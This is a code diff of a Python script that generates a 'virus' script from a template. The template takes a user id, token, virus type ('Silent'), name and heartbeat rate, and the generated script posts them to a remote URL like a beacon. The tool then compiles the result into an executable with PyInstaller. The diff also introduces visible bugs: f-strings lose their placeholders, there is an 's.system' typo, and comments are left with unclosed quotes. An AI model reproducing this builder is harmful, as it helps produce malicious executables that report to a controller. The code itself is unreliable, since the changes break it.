@@ -32,13 +32,14 @@ def send_request(user_id, token, virus_type, name, heartbeat_rate):
         'heartbeat_rate': '{heartbeat_rate}',
     }}
     response = requests.post(url, json=data)
-    logging.debug(f'Response status code: {response.status_code}')
-    logging.debug(f'Response content: {response.content}')
-    os.system('echo {response.status_code} , {response.content} && pause'.format(response.status_code, response.content))
+    logging.debug(f'Response status code: response.status_code')
+    logging.debug(f'Response content: response.content')
+    os.system('echo response.status_code , response.content && pause'.format(response.status_code, response.content))
     s.system('echo cmd testt && pause')
 
-
+#os.system('echo Trying to send request)
 send_request(user_id='{user_id}', token='{token}', virus_type='{virus_type}', name='{name}', heartbeat_rate='{heartbeat_rate}')
+#os.system('echo Displaying message)
 display_message(user_id='{user_id}', virus_type='{virus_type}')
 
 # Clean up the temp file
@@ -51,7 +52,7 @@ def test():
 def generateExe(source_file):
     # Call PyInstaller to compile the script to an exe
     try:
-        subprocess.check_call(['python', '-m', 'PyInstaller', '--onefile', '--debug=all', '--distpath', '/dist', '--hidden-import=requests', '--hidden-import=stringprep', source_file])
+        subprocess.check_call(['python', '-m','PyInstaller', '--clean', '--debug=all', '--distpath', '/dist', '--hidden-import=requests', '--hidden-import=stringprep', source_file])
         return "Success"
     except subprocess.CalledProcessError as e:
         print(f"PyInstaller failed with error code: {e.returncode}")
@@ -75,7 +76,7 @@ def generateScript(user_id, token, virus_type, name, heartbeat_rate):
     with open('generated_script.py', 'w') as f:
         f.write(filled_template)
 
-# generateScript(1, '1234567890', 'Silent', 'TestVirus1', '1h')
+generateScript(1, '1234567890', 'Silent', 'TestVirus1', '1h')
 # Wine compile test
 generateExe("generated_script.py")
 
